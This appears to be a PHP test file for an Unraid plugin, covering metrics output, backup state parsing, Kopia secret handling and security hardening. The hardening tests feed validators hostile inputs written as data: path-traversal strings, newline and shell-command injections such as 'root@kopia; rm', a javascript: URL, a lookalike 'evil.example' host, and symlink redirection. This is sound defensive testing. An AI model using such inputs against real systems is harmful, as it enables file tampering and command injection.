    @mkdir(dirname($dir) . '/base', 0755);
    check('metrics folder: made below an existing parent', metricsEnsureDir($dir) && is_dir($dir));
    file_put_contents("$dir/uso_gone.prom", "# a desk let go\n");
    file_put_contents("$dir/node_other.prom", "other_tool 1\n");
    file_put_contents("$dir/.uso_backup.prom.0a1b2c3d4e5f.tmp", 'left by a crash');
    touch("$dir/.uso_backup.prom.0a1b2c3d4e5f.tmp", $now - 3600);
    $big = array_map(fn ($i) => [['kind' => 'app', 'name' => str_repeat('x', 60) . "-$i"], $i], range(1, 400));
    $r = metricsWrite($now, ['backup' => [$g('uso_backup_running', [[[], 1]]), $g('uso_backup_package_bytes', $big)],
                             'caretaker' => [$g('uso_caretaker_open_findings', [[['level' => 'required'], 0]])]], $dir);
    $names = array_values(array_filter(scandir($dir) ?: [], fn ($n) => $n[0] !== '.'));
    same('metrics files: one per area and the office\'s, foreign ones untouched', ['node_other.prom', 'uso_backup.prom', 'uso_caretaker.prom', 'uso_office.prom'], $names);
    same('metrics files: no temporary file left (an old one from a crash removed)', [], array_values(array_diff(scandir($dir) ?: [], ['.', '..'], $names)));
    same('metrics files: the big per-item family was left out', ['uso_backup_package_bytes'], $r['dropped'] ?? null);
    $total = array_sum(array_map(fn ($n) => filesize("$dir/$n"), preg_grep('/^uso_.*\.prom$/', $names)));
    check("metrics files: all together within " . METRICS_MAX_BYTES . " bytes ($total)", $total <= METRICS_MAX_BYTES && $total === array_sum($r['files']));
    $office = metricsParseBack((string) file_get_contents("$dir/uso_office.prom"));
    check('metrics files: the office\'s file reads back', is_array($office), is_string($office) ? $office : '');
    same('metrics files: office info and when written', [[['version' => AGENT_VERSION], '1'], (string) $now, '1'],
        is_array($office) ? [$office['uso_office_info']['samples'][0], $office['uso_metrics_written_timestamp_seconds']['samples'][0][1],
                             $office['uso_metrics_dropped_families']['samples'][0][1]] : null);
    check('metrics files: every file reads back', array_reduce(preg_grep('/^uso_.*\.prom$/', $names), fn ($ok, $n) => $ok && is_array(metricsParseBack((string) file_get_contents("$dir/$n"))), true));
    check('metrics fresh: just written', metricsFresh($dir, $now) && !metricsFresh($dir, $now + METRICS_FRESH + 1));
    $tmp = writeNewFile("$dir/.uso_backup.prom", 'x');
    check('metrics: writeAtomic\'s temporary names are hidden and never end in .prom', $tmp !== null && preg_match(METRICS_TMP, basename($tmp)) === 1 && !str_ends_with($tmp, '.prom'));
    @unlink((string) $tmp);
    metricsWrite($now + 60, ['backup' => [$g('uso_backup_running', [[[], 0]])]], $dir);
    check('metrics files: an area that stops reporting loses its file', !file_exists("$dir/uso_caretaker.prom") && is_file("$dir/uso_backup.prom"));

    // never through a link
    $link = dirname($dir) . '/linked';
    symlink(dirname($dir) . '/base', $link);
    check('metrics folder: a link is refused', !metricsEnsureDir($link) && !metricsEnsureDir("$link/metrics") && !file_exists(dirname($dir) . '/base/metrics'));
    check('metrics folder: nothing without its base', metricsWrite($now, [], dirname($dir) . '/missing/metrics') === null);

    // Mr. Backupsy's hook from the engine's state files
    $st = dirname($dir) . '/state';
    mkdir($st);
    $run = fn (string $result, int $end, array $more = []) => ['interface' => 1, 'mode' => 'backup', 'result' => $result, 'started' => $end - 600, 'finished' => $end] + $more;
    file_put_contents("$st/last-run.json", jsonEncode($run('failed', 1791229704, ['downtime_s' => 285, 'errors' => 2, 'warnings' => 1,
        'kopia' => ['enabled' => true, 'planned' => ['app:a', 'b', 'c'], 'done' => [['name' => 'app:a', 'ok' => true], ['name' => 'b', 'ok' => false]]],
        'packages' => ['written' => true, 'written_bytes' => 300, 'list' => [['kind' => 'app', 'name' => 'immich', 'bytes' => 200, 'result' => 'ok'],
            ['kind' => 'vm', 'name' => 'Debian', 'bytes' => 100, 'result' => 'ok'], ['kind' => 'app', 'name' => 'planned', 'bytes' => 1, 'result' => 'planned']]]])));
    file_put_contents("$st/history.jsonl", jsonEncode($run('warnings', 1791100000)) . "\n" . jsonEncode($run('ok', 1791200000)) . "\n"
        . jsonEncode(['mode' => 'backup', 'result' => 'skipped', 'finished' => 1791210000]) . "\n" . jsonEncode($run('failed', 1791229704)) . "\n");
    file_put_contents("$st/status.json", jsonEncode(['result' => 'running', 'mode' => 'backup', 'phase' => 'kopia', 'started' => 1791241202]));
    $bk = [];
    foreach (backupMetrics($st) as $f) {
        $bk[$f['name']] = count($f['samples']) === 1 && !$f['samples'][0][0] ? $f['samples'][0][1] : $f['samples'];
    }
    same('backup metrics: the last run', [false, [[['result' => 'failed'], 1]], 1791229704, 600, 285, 2, 1],
        [$bk['uso_backup_last_success'] ?? null, $bk['uso_backup_last_result'] ?? null, $bk['uso_backup_last_run_end_timestamp_seconds'] ?? null,
         $bk['uso_backup_last_duration_seconds'] ?? null, $bk['uso_backup_last_downtime_seconds'] ?? null, $bk['uso_backup_last_errors'] ?? null, $bk['uso_backup_last_warnings'] ?? null]);
    same('backup metrics: the last success from the history (a skipped run is none)', 1791200000, $bk['uso_backup_last_success_timestamp_seconds'] ?? null);
    same('backup metrics: Kopia sources — one not reached counts as failed', [[['result' => 'ok'], 1], [['result' => 'failed'], 2]], $bk['uso_backup_last_kopia_sources'] ?? null);
    same('backup metrics: package sizes, planned ones not', [[['kind' => 'app', 'name' => 'immich'], 200], [['kind' => 'vm', 'name' => 'Debian'], 100]], $bk['uso_backup_package_bytes'] ?? null);
    same('backup metrics: running needs the lock too', [false, null], [$bk['uso_backup_running'] ?? null, $bk['uso_backup_current_phase'] ?? null]);
    same('backup metrics: no skipped.json, no series', null, $bk['uso_backup_last_skipped_timestamp_seconds'] ?? null);
    file_put_contents("$st/skipped.json", jsonEncode(['time' => 1791244800, 'mode' => 'backup', 'reason' => 'lock_busy', 'result' => 'skipped']));
    $sk = array_values(array_filter(backupMetrics($st), fn ($f) => $f['name'] === 'uso_backup_last_skipped_timestamp_seconds'));
    same('backup metrics: a skipped run', [[['mode' => 'backup', 'reason' => 'lock_busy'], 1791244800]], $sk[0]['samples'] ?? null);
    file_put_contents("$st/skipped.json", '{"time":"soon","mode":"backup"}');
    same('backup metrics: skipped.json in another shape is left out', [], array_values(array_filter(backupMetrics($st), fn ($f) => $f['name'] === 'uso_backup_last_skipped_timestamp_seconds')));
    same('backup metrics: no state folder, nothing', [], backupMetrics("$st/none"));

    // Ms. Snapshotini: per pool and disk, Docker's layers left out; VMs only where they are on
    $pools = snapshotMetricsPools(['time' => 50, 'zfs' => ['pools' => [['name' => 'cache', 'snapused' => 10], ['name' => 'empty', 'snapused' => 0]],
        'snapshots' => [['pool' => 'cache', 't' => 5, 'docker' => false], ['pool' => 'cache', 't' => 9, 'docker' => false], ['pool' => 'cache', 't' => 99, 'docker' => true]]],
        'btrfs' => ['devices' => [['name' => 'disk1', 'scanned' => null], ['name' => 'disk2', 'scanned' => null], ['name' => 'disk3', 'scanned' => 40]],
                    'snapshots' => [['pool' => 'disk1', 't' => 7]]], 'vm' => ['available' => false, 'snapshots' => []]]);
    same('snapshot metrics: per pool and disk (a disk never read is left out)', [['zfs', 'cache', 2, 9, 10], ['zfs', 'empty', 0, 0, 0], ['btrfs', 'disk3', 0, 0, null], ['btrfs', 'disk1', 1, 7, null]],
        array_map(fn ($p) => [$p['fs'], $p['pool'], $p['n'], $p['t'], $p['used']], $pools['pools'] ?? []));

    // the team lead: open points by level, like the Dashboard tile (only desks that work here, nothing put aside)
    $care = ['time' => 70, 'checks' => [
        'backup' => [['level' => 'required', 'ok' => false], ['level' => 'required', 'ok' => null], ['level' => 'recommended', 'ok' => true],
                     ['level' => 'recommended', 'ok' => false, 'acked' => true], ['level' => 'recommended', 'ok' => false], ['level' => 'hint', 'ok' => null]],
        'gone' => [['level' => 'required', 'ok' => false]]]];
    $ct = caretakerMetrics($care, ['backup', 'caretaker']);
    same('caretaker metrics: open by level', [[['level' => 'required'], 2], [['level' => 'recommended'], 1], [['level' => 'hint'], 1]], $ct[0]['samples'] ?? null);

    // the chain: where the host reaches Prometheus, and its target for the Node Exporter
    same('prometheus: published port', ['http://127.0.0.1:9090', false],
        caretakerPrometheusUrl(['HostConfig' => ['NetworkMode' => 'bridge'], 'NetworkSettings' => ['Ports' => ['9090/tcp' => [['HostIp' => '0.0.0.0', 'HostPort' => '9090']]],
            'Networks' => ['bridge' => ['IPAddress' => '172.17.0.5']]]]));
    same('prometheus: host network with its own port', ['http://127.0.0.1:9191', false],
        caretakerPrometheusUrl(['Args' => ['--web.listen-address=:9191'], 'HostConfig' => ['NetworkMode' => 'host']]));
    same('prometheus: an address of its own (br0)', ['http://192.168.7.30:9090', true],
        caretakerPrometheusUrl(['HostConfig' => ['NetworkMode' => 'br0'], 'NetworkSettings' => ['Ports' => [], 'Networks' => ['br0' => ['IPAddress' => '192.168.7.30']]]]));
    $targets = fn (array ...$t) => ['status' => 'success', 'data' => ['activeTargets' => $t]];
    $tg = fn (string $job, string $url, string $health) => ['labels' => ['job' => $job, 'instance' => parse_url($url, PHP_URL_HOST) . ':' . parse_url($url, PHP_URL_PORT)],
                                                          'scrapeUrl' => $url, 'health' => $health];
    same('prometheus: node target up', ['up' => true, 'target' => '192.168.7.20:9100'],
        caretakerNodeTarget($targets($tg('prometheus', 'http://localhost:9090/metrics', 'up'), $tg('node', 'http://192.168.7.20:9100/metrics', 'up'))));
    same('prometheus: a target on port 9100 under another job, down', ['up' => false, 'target' => '10.0.0.2:9100'],
        caretakerNodeTarget($targets($tg('server', 'http://10.0.0.2:9100/metrics', 'down'))));
    same('prometheus: no node job', 'none', caretakerNodeTarget($targets($tg('prometheus', 'http://localhost:9090/metrics', 'up'))));
    same('prometheus: an odd answer', null, caretakerNodeTarget(['status' => 'error']));
    hardeningRm(dirname($dir));
    $GLOBALS['metricsNoted'] = [];
}

// ===================================================================== hardening

/** A temporary folder for a test, removed again by hardeningRm() */
function hardeningTmp(string $name): string
{
    $dir = sys_get_temp_dir() . "/uso-test-$name-" . getmypid();
    @mkdir($dir, 0700, true);
    return $dir;
}

function hardeningRm(string $dir): void
{
    if (!is_dir($dir) || is_link($dir)) {
        @unlink($dir);
        return;
    }
    foreach (array_diff(scandir($dir) ?: [], ['.', '..']) as $n) {
        hardeningRm("$dir/$n");
    }
    @rmdir($dir);
}

/** writeAtomic(): a link at the target or a file in the way is never written through; the mode is there from the start */
function testSafeWrites(): void
{
    $dir = hardeningTmp('write');
    $victim = "$dir/victim.txt";
    file_put_contents($victim, 'keep');
    symlink($victim, "$dir/state.json");
    writeAtomic("$dir/state.json", '{"ok":true}', 0600, 0, 0);
    same('writeAtomic: the victim behind a link is untouched', 'keep', file_get_contents($victim));
    check('writeAtomic: the link is replaced by a file', !is_link("$dir/state.json") && is_file("$dir/state.json"));
    same('writeAtomic: mode 0600', '600', substr(sprintf('%o', fileperms("$dir/state.json")), -3));
    writeAtomic("$dir/script", "#!/bin/bash\n", 0755, 0, 0);
    same('writeAtomic: a script keeps its execute bits', '755', substr(sprintf('%o', fileperms("$dir/script")), -3));
    same('writeAtomic: no temporary files left', [], glob("$dir/.*.tmp") ?: []);
    $tmp = writeNewFile("$dir/.x", 'a');
    check('writeNewFile: a new file of its own', $tmp !== null && is_file($tmp) && str_starts_with(basename($tmp), '.x.'));

    // the mailbox and data/office: a real folder of the web server's user, closed to others
    $box = "$dir/mailbox";
    mkdir($box, 0770);
    chown($box, WEB_UID);
    check('mailbox of the web server: accepted', privateDirOk($box));
    chmod($box, 0777);
    check('mailbox open to others: refused', !privateDirOk($box));
    chmod($box, 0770);
    chown($box, WEB_UID + 1);
    check("mailbox of another user: refused", !privateDirOk($box));
    symlink($box, "$dir/linkbox");
    check('mailbox through a link: refused', !privateDirOk("$dir/linkbox"));
    check('a link where a private folder belongs is left alone', !privateDirEnsure("$dir/linkbox", 0700, false) && is_link("$dir/linkbox"));
    check('a link where the mailbox belongs becomes a folder', privateDirEnsure("$dir/linkbox", 0770, true) && !is_link("$dir/linkbox"));
    same('the folder the link pointed to keeps its owner', WEB_UID + 1, fileowner($box));
    hardeningRm($dir);
}

/** Ms. Dustdevil's manifests lie in folders others may write to: only entries of her own shape count */
function testTrashManifest(): void
{
    $st = '20261005-120000';
    foreach ([['templates/my-app.xml', 'template'], ['compose/stack', 'stack'], ['appdata/foo', 'appdata'], ['vms/win11', 'domain'],
              ['strays/0a1b2c3d/my-x.xml', 'stray'], ['icons/0a1b2c3d/compose.override.yaml', 'icon'], ['nvram/abc_VARS.fd', 'nvram'],
              ["@cache/appdata/_UnraidSecretaryOffice-trash-$st-foo", 'appdata']] as [$as, $kind]) {
        check("manifest as accepted: $as", clTrashAsOk($as, $kind, $st));
    }
    foreach ([['../../../../boot/config/super.dat', 'template'], ['templates/../../x', 'template'], ['templates/./x', 'template'],
              ['/boot/config/go', 'template'], ['templates//x', 'template'], ['appdata/foo', 'template'], ['templates/a/b', 'template'],
              ['strays/x', 'stray'], ["templates/x\ny", 'template'], ['', 'template'], ['@cache/appdata', 'appdata'],
              ['@cache/appdata/_UnraidSecretaryOffice-trash-20990101-000000-foo', 'appdata'], ["@cache/appdata/_UnraidSecretaryOffice-trash-$st-foo", 'template'],
              ["@cache/../x/_UnraidSecretaryOffice-trash-$st-foo", 'appdata'], ['@cache', 'appdata']] as [$as, $kind]) {
        check('manifest as refused: ' . json_encode($as) . " ($kind)", !clTrashAsOk($as, $kind, $st));
    }
    check('manifest from: an absolute path', clTrashPathOk('/mnt/cache/appdata/foo'));
    foreach (['mnt/x', '/mnt/../boot', '/mnt/./x', '/mnt//x', "/mnt/x\n", '/'] as $p) {
        check('manifest from refused: ' . json_encode($p), !clTrashPathOk($p));
    }
    check('dataset name ok', clZfsNameOk('cache/appdata/foo bar'));
    check('dataset name with .. refused', !clZfsNameOk('cache/../foo'));

    $dir = hardeningTmp('trash');
    mkdir("$dir/run/appdata", 0755, true);
    mkdir("$dir/elsewhere", 0755);
    symlink("$dir/elsewhere", "$dir/run/strays");
    check('restore source inside the run: ok', clRunPathOk("$dir/run", 'appdata/foo'));
    check('restore source through a linked folder: refused', !clRunPathOk("$dir/run", 'strays/0a1b2c3d/my-x.xml'));
    hardeningRm($dir);
}

/** Jack Emby's path mappings and EmbyCache's paths never lead out of the shares */
function testEmbyPaths(): void
{
    foreach ([['/media/movies', '/mnt/user/Filme'], ['/media/tv/', '/mnt/user/Serien/TV'], ['/media/skip', '']] as [$from, $to]) {
        check("mapping accepted: $from => $to", embyMappingOk($from, $to));
    }
    foreach ([['/media', '/mnt/user/../../boot'], ['/media', '/mnt/user/Filme/../../../etc'], ['media', '/mnt/user/Filme'],
              ['/media/../x', '/mnt/user/Filme'], ['/media', '/mnt/cache/Filme'], ['/media', "/mnt/user/Filme\n"], ['/media', '/mnt/user/']] as [$from, $to]) {
        check('mapping refused: ' . json_encode([$from, $to]), !embyMappingOk($from, $to));
    }
    [$exit] = run(['python3', '--version'], 10);
    if ($exit !== 0) {
        return;                                    // no Python on this server: EmbyCache can't run here either
    }
    $py = 'import sys; sys.path.insert(0, sys.argv[1]); import embycache_lib as l; '
        . 'loc = l.Locations({"cache_path": "/mnt/cache", "array_path": "/mnt/user0", "user_path": "/mnt/user", "array_disks_glob": "/mnt/disk[0-9]*"}, '
        . '{"/media/movies": "/mnt/user/Filme"}); '
        . 'print(loc.rel_from_docker("/media/movies/A/a.mkv"), loc.rel_from_docker("/media/movies/../../../../boot/config/go"), '
        . 'loc.rel_from_docker("/media/movies/A/../../Other/x"))';
    [$exit, $out] = run(['env', 'EMBYCACHE_DIR=' . sys_get_temp_dir(), 'PYTHONDONTWRITEBYTECODE=1', 'python3', '-c', $py, OFFICE_DIR . '/embycache'], 30);
    same('EmbyCache: paths with ".." are skipped', 'Filme/A/a.mkv None None', trim($out));
}

/** Validators end at the end of the string: "$" alone would let a trailing newline through into a name, a file or a command */
function testAnchors(): void
{
    check('snapshot name ok', preg_match(SNAPSHOT_NAME, 'manual-20261005') === 1);
    check('snapshot name with a trailing newline refused', preg_match(SNAPSHOT_NAME, "manual-20261005\n") === 0);
    check('menu name ok', officeMenuNameValid('Office'));
    check('menu name with a trailing newline refused', !officeMenuNameValid("Office\n"));
    check('picture address ok', clIconUrlOk('https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/png/emby.png'));
    check('picture address with a trailing newline refused', !clIconUrlOk("https://example.com/a.png\n"));
    check('plan id with a trailing newline refused', preg_match(SNAPPLAN_ID, "daily\n") === 0);
}

/** The release the caretaker links to: a version number and a page of the office's repository on GitHub, nothing else */
function testUpdateClean(): void
{
    $ok = officeUpdateClean(['latest' => '1.26.0', 'url' => 'https://github.com/' . OFFICE_REPO . '/releases/tag/v1.26.0']);
    same('release kept', ['1.26.0', 'https://github.com/' . OFFICE_REPO . '/releases/tag/v1.26.0'], [$ok['latest'] ?? null, $ok['url']]);
    $bad = officeUpdateClean(['latest' => "99\n", 'url' => 'javascript:alert(1)']);
    same('release with odd values', [null, ''], [$bad['latest'] ?? null, $bad['url']]);
    same('a link elsewhere is dropped', '', officeUpdateClean(['url' => 'https://github.com.evil.example/x'])['url']);
}

/**
 * The Consultant's Kopia setup: the user's keys and password go from the web side through a RAM
 * file (gone once read) to Kopia's stdin — end to end with a stand-in for docker and Kopia: no
 * secret in any file but that one (and Kopia's own config), in no log, no state, no answer, no ps.
 */
function testAdvisorSecrets(): void
{
    $tmp = hardeningTmp('advisor-secrets');
    $inbox = "$tmp/inbox";
    mkdir($inbox, 0700);
    $put = function (string $name, string $text, int $mode = 0600) use ($inbox): string {
        file_put_contents("$inbox/$name.secret", $text);
        chmod("$inbox/$name.secret", $mode);
        return $name;
    };
    $id = str_repeat('a', 32);
    same('secret: taken', ['password' => 'pw'], advisorSecretTake($put($id, '{"password":"pw"}'), $inbox));
    check('secret: gone once taken', !file_exists("$inbox/$id.secret"));
    foreach (['open to others' => fn () => $put($id, '{"password":"pw"}', 0644), 'a wrong name' => fn () => '../inbox/x',
              'unknown' => fn () => str_repeat('b', 32), 'not JSON' => fn () => $put($id, 'pw')] as $what => $make) {
        try {
            advisorSecretTake($make(), $inbox);
            check("secret refused: $what", false);
        } catch (Problem $p) {
            same("secret refused: $what", 'ad_secret_missing', $p->key);
        }
    }
    check('secret: a refused one is gone all the same', !file_exists("$inbox/$id.secret"));
    file_put_contents("$tmp/victim", 'keep');
    symlink("$tmp/victim", "$inbox/$id.secret");
    try {
        advisorSecretTake($id, $inbox);
    } catch (Problem) {
    }
    check('secret: a link is never read, only removed', !is_link("$inbox/$id.secret") && file_get_contents("$tmp/victim") === 'keep');
    chmod($inbox, 0755);
    try {
        advisorSecretTake($put($id, '{"password":"pw"}'), $inbox);
        check('secret refused: an inbox open to others', false);
    } catch (Problem $p) {
        same('secret refused: an inbox open to others', 'ad_secret_missing', $p->key);
    }
    chmod($inbox, 0700);
    touch("$inbox/" . $put(str_repeat('c', 32), '{}') . '.secret', time() - 600);
    same('secret: the sweep removes what nobody took', [1, []], [advisorInboxSweep($inbox, 120), glob("$inbox/*") ?: []]);
    same('secret: scrubbed out of what Kopia says', "ERROR invalid ••• for •••\n", advisorScrub("ERROR invalid pass\x01word-123 for AKIAXYZ\n", ['pass' => 'password-123', 'k' => 'AKIAXYZ']));

    // end to end: the web side's handover (in a process of its own, the secrets on its stdin) …
    $secrets = ['password' => 'Corr3ct-Horse-' . bin2hex(random_bytes(4)), 'access_key' => 'AKIATEST' . strtoupper(bin2hex(random_bytes(4))),
                'secret_key' => 'sk/' . bin2hex(random_bytes(12)) . '+x'];
    $web = "$tmp/web.php";
    file_put_contents($web, '<?php require ' . var_export(OFFICE_DIR . '/src/place.php', true) . '; require '
        . var_export(OFFICE_DIR . '/src/api.php', true) . '; echo apiSecretStash("advisor.kopia_repo", json_decode(stream_get_contents(STDIN), true));');
    $p = proc_open([PHP_BINARY, $web], [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null, ['OFFICE_INBOX_DIR' => $inbox, 'PATH' => getenv('PATH')]);
    fwrite($pipes[0], json_encode($secrets));
    fclose($pipes[0]);
    $ref = trim((string) stream_get_contents($pipes[1]));
    $webErr = (string) stream_get_contents($pipes[2]);
    proc_close($p);
    $st = @lstat("$inbox/$ref.secret");
    check('secret e2e: the web side left a 0600 file in the inbox', $st !== false && ($st['mode'] & 0777) === 0600, $webErr);
    $refused = proc_open([PHP_BINARY, $web], [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes2, null, ['OFFICE_INBOX_DIR' => $inbox]);
    fwrite($pipes2[0], json_encode(['password' => ['nested']]));
    fclose($pipes2[0]);
    check('secret e2e: the web side refuses odd shapes', str_contains((string) stream_get_contents($pipes2[1]), 'bad_request'));
    proc_close($refused);

    // … a stand-in for docker and Kopia: records hashes of what Kopia got, ps while it runs, writes its config as Kopia would
    $bin = "$tmp/bin";
    mkdir($bin);
    file_put_contents("$bin/docker", "#!/bin/sh\n# stand-in: docker exec [-i] <name> <cmd…> | docker restart …\n"
        . "case \"\$1\" in restart) exit 0;; exec) shift; [ \"\$1\" = -i ] && shift; shift; PATH=\"$bin:\$PATH\" exec \"\$@\";; esac\nexit 1\n");
    file_put_contents("$bin/kopia", "#!/bin/sh\n# stand-in for Kopia\n"
        . "[ \"\$1\" = --version ] && { echo '0.99.0 build: stand-in'; exit 0; }\n"
        . "ps -eo args > '$tmp/ps.txt'\n"
        . "printf '%s\\n' \"\$*\" > '$tmp/args.txt'\n"
        . "for v in \"\$KOPIA_PASSWORD\" \"\$AWS_ACCESS_KEY_ID\" \"\$AWS_SECRET_ACCESS_KEY\"; do printf '%s' \"\$v\" | sha256sum | cut -c1-64; done > '$tmp/got.txt'\n"
        . "if [ \"\$2\" = connect ]; then echo \"ERROR: invalid repository password \$KOPIA_PASSWORD\" >&2; exit 1; fi\n"
        . "printf '{\"storage\":{\"type\":\"s3\",\"config\":{\"bucket\":\"b1\",\"endpoint\":\"s3.example.test\",\"accessKeyID\":\"%s\",\"secretAccessKey\":\"%s\"}},\"hostname\":\"kopia\",\"username\":\"root\"}' "
        . "\"\$AWS_ACCESS_KEY_ID\" \"\$AWS_SECRET_ACCESS_KEY\" > '$tmp/config/repository.config'\n");
    chmod("$bin/docker", 0755);
    chmod("$bin/kopia", 0755);
    mkdir("$tmp/config");
    putenv("OFFICE_ADVISOR_DOCKER=$bin/docker");
    $target = ['name' => 'kopia-standin', 'image' => 'ghcr.io/imagegenius/kopia', 'webui' => 'http://192.0.2.10:51515',
               'info' => ['config' => "$tmp/config", 'sources' => ['host' => ADVISOR_SNAPSHOTS, 'target' => '/uso'], 'restore' => null, 'folders' => []]];
    $request = ['mode' => 'create', 'storage' => 's3', 'provider' => 'mega', 'endpoint' => 's3.example.test', 'bucket' => 'b1', 'prefix' => 'unraid/',
                'secret_ref' => $ref];
    $logBefore = (int) @filesize(AGENT_LOG);
    try {
        $answer = advisorKopiaRepo($request, $inbox, $target);
    } catch (Problem $p) {
        $answer = ['ok' => false, 'error' => $p->toArray()];
    }
    same('secret e2e: Kopia created and connected', true, $answer['ok'] ?? null);
    same('secret e2e: the RAM file is gone', [], glob("$inbox/*") ?: []);
    same('secret e2e: Kopia got the three secrets on its stdin', array_map(fn ($v) => hash('sha256', $v), array_values($secrets)),
        array_values(array_filter(explode("\n", (string) @file_get_contents("$tmp/got.txt")))));
    same('secret e2e: Kopia\'s arguments, no secret among them', 'repository create s3 --bucket=b1 --endpoint=s3.example.test --prefix=unraid/ --persist-credentials',
        trim((string) @file_get_contents("$tmp/args.txt")));
    same('secret e2e: the facts for the recovery sheet', ['b1', 's3.example.test', 'unraid/', 'root@kopia', '0.99.0', 'mega'],
        [$answer['facts']['bucket'] ?? null, $answer['facts']['endpoint'] ?? null, $answer['facts']['prefix'] ?? null, $answer['facts']['client'] ?? null,
         $answer['facts']['version'] ?? null, $answer['facts']['provider'] ?? null]);
    $ps = (string) @file_get_contents("$tmp/ps.txt");
    check('secret e2e: ps was looked at while Kopia ran', str_contains($ps, 'repository create s3'));

    // … and the second time a connect that fails, Kopia repeating the password: cleaned out of the answer
    file_put_contents("$inbox/" . ($ref2 = str_repeat('d', 32)) . '.secret', json_encode($secrets));
    chmod("$inbox/$ref2.secret", 0600);
    try {
        advisorKopiaRepo(['mode' => 'connect', 'secret_ref' => $ref2] + $request, $inbox, $target);
        $fail = null;
    } catch (Problem $p) {
        $fail = $p;
    }
    same('secret e2e: a failing Kopia is a Problem', 'ad_kopia_failed', $fail?->key);
    $said = (string) ($fail?->params['output'] ?? '');
    check('secret e2e: its words without the password', str_contains($said, 'invalid repository password •••') && !str_contains($said, $secrets['password']));
    same('secret e2e: the RAM file is gone after a failure too', [], glob("$inbox/*") ?: []);
    $leaks = [];
    $look = function (string $dir) use (&$look, &$leaks, $secrets, $tmp) {
        foreach (array_diff(scandir($dir) ?: [], ['.', '..']) as $n) {
            $path = "$dir/$n";
            if (is_link($path) || $path === "$tmp/config/repository.config") {   // Kopia's own config holds them, as when set up by hand
                continue;
            }
            if (is_dir($path)) {
                $look($path);
                continue;
            }
            $text = (string) @file_get_contents($path);
            foreach ($secrets as $k => $v) {
                if (str_contains($text, $v)) {
                    $leaks[] = "$k in $path";
                }
            }
        }
    };
    $look($tmp);
    $look(DATA_DIR);
    foreach ($secrets as $k => $v) {
        if (str_contains($ps, $v)) {
            $leaks[] = "$k in ps";
        }
        if (str_contains(json_encode([$answer, $fail?->params]), $v)) {
            $leaks[] = "$k in an answer";
        }
    }
    same('secret e2e: no secret in any file (data folder, log, state, the test\'s folders), in ps or an answer', [], $leaks);
    check('secret e2e: the log says what happened, nothing more', str_contains((string) @file_get_contents(AGENT_LOG, false, null, $logBefore), 'Kopia repository create (s3) in kopia-standin - exit 0'));
    $kept = (string) @file_get_contents("$tmp/config/repository.config");
    check('secret e2e: Kopia\'s own config keeps the connection (its job)', str_contains($kept, $secrets['access_key']));
    putenv('OFFICE_ADVISOR_DOCKER');

    // the request's fields: each checked
    $k = ['info' => ['folders' => [['host' => '/mnt/disks/usb/kopia', 'target' => '/local']]]];
    $base = ['mode' => 'create', 'storage' => 's3', 'endpoint' => 's3.example.test', 'bucket' => 'b1'];
    $good = ['password' => 'long-enough-pw', 'access_key' => 'AKIA1', 'secret_key' => 'secret-key-1'];
    foreach ([['endpoint', ['endpoint' => 'https://s3.example.test']], ['endpoint', ['endpoint' => "s3.exa\nmple.test"]], ['bucket', ['bucket' => 'b']],
              ['prefix', ['prefix' => '../x']], ['prefix', ['prefix' => '/abs']], ['mode', ['mode' => 'delete']], ['region', ['region' => 'eu central']],
              ['password', [], ['password' => 'short']], ['password', [], ['password' => "two\nlines-password"]], ['secret_key', [], ['secret_key' => 'with space key']],
              ['path', ['storage' => 'filesystem', 'path' => '/config/repo']], ['path', ['storage' => 'filesystem', 'path' => '/local/../etc']],
              ['client', ['mode' => 'connect', 'client' => 'root@kopia; rm']]] as $case) {
        [$want, $over, $sec] = $case + [2 => []];
        try {
            advisorKopiaSpec($over + $base, $sec + $good, $k);
            check("kopia field refused: $want " . json_encode($over + $sec), false);
        } catch (Problem $p) {
            same("kopia field refused: $want " . json_encode($over + $sec), $want, $p->params['field'] ?? null);
        }
    }
    $fs = advisorKopiaSpec(['storage' => 'filesystem', 'path' => '/local/repo/'] + $base, $good, $k);
    same('kopia field: a folder under a writable path', ['/local/repo', '/mnt/disks/usb/kopia/repo', ['create', 'filesystem', '--path=/local/repo', '--persist-credentials']],
        [$fs['path'], $fs['path_host'], $fs['args']]);
    same('kopia field: connect with another user@host', 'root@nostromo', advisorKopiaSpec(['mode' => 'connect', 'client' => 'root@nostromo'] + $base, $good, $k)['client']);
    hardeningRm($tmp);
}

// ===================================================================== strings

function langFile(string $file): array
{
    $j = json_decode((string) @file_get_contents($file), true);
    if (!is_array($j)) {
        check("valid JSON: $file", false);
        return [];
    }
    unset($j['_meta']);
    return $j;
}

/** The {name} placeholders of a text or of all forms of a plural, sorted */
function langPlaceholders(mixed $v): array
{
    $found = [];
    foreach (is_array($v) ? $v : [$v] as $s) {
        if (is_string($s) && preg_match_all('/\{(\w+)\}/', $s, $m)) {
            $found = array_merge($found, $m[1]);
        }
    }
    $found = array_values(array_unique($found));
    sort($found);
    return $found;
}

/** A plural: {"one": …, "other": …} with plural categories only (Intl.PluralRules), "other" always there */
function langPluralOk(mixed $v): bool
{
    if (!is_array($v) || !isset($v['other'])) {
        return false;
    }
    foreach ($v as $cat => $s) {
        if (!in_array($cat, ['zero', 'one', 'two', 'few', 'many', 'other'], true) || !is_string($s)) {
            return false;
        }
    }
    return true;
}

function testStrings(): void
{
    $pub = OFFICE_DIR . '/public';
    $sets = ['' => "$pub/lang"];
    foreach (glob("$pub/desks/*/lang") ?: [] as $dir) {
        $sets[basename(dirname($dir))] = $dir;
    }
    $complete = ['de', 'it', 'fr', 'es'];   // need every English key in every set; other languages may leave keys out (English fills in)
    $en = [];
    foreach ($sets as $desk => $dir) {
        $de = langFile("$dir/de.json");
        $e = langFile("$dir/en.json");
        $where = $desk === '' ? 'office' : $desk;
        same("$where: only in German", [], array_values(array_diff(array_keys($de), array_keys($e))));
        same("$where: only in English", [], array_values(array_diff(array_keys($e), array_keys($de))));
        foreach ($e as $k => $v) {
            $en[$desk === '' ? $k : "$desk.$k"] = true;
        }
        same("$where: English plurals well-formed", [], array_keys(array_filter($e, fn ($v) => is_array($v) && !langPluralOk($v))));

        // every other language: no keys English lacks, the same placeholders, plurals where English has them
        $codes = array_map(fn ($f) => basename($f, '.json'), glob("$dir/*.json") ?: []);
        foreach (array_diff(array_unique(array_merge($complete, $codes)), ['en']) as $code) {
            $l = $code === 'de' ? $de : langFile("$dir/$code.json");   // a missing file of a complete language fails here
            if ($code !== 'de') {   // German's keys are compared above
